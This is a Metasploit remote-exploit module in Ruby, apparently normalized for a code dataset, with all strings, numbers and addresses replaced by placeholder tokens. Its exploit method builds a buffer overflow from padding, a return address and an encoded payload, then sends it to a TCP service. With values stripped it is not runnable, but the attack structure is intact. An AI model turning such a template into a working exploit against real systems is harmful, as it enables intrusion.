require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = GoodRanking include Msf :: Exploit :: Remote :: Tcp def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , ] , <str> = > [ <str> ] , <str> = > [ ARCH_X86 ] , <str> = > true , <str> = > { <str> = > <str> , } , <str> = > { <str> = > <str> , <str> = > - <int> , } , <str> = > [ [ <str> , { <str> = > <hex> } ] , [ <str> , { <str> = > <hex> } ] , ] , <str> = > <str> , <str> = > <int> ) ) register_options ( [ Opt :: RPORT ( <int> ) , Opt :: LHOST ( ) , ] , self . class ) end def check connect banner = sock . get_once || <str> disconnect if banner . to_s =~ <str> return Exploit :: CheckCode :: Detected end return Exploit :: CheckCode :: Safe end def exploit connect sploit = <str> + rand_text_alphanumeric ( <int> - datastore [ <str> ] . length , payload_badchars ) sploit << [ target [ <str> ] ] . pack ( <str> ) + payload . encoded sock . put ( sploit + <str> ) handler disconnect end end 
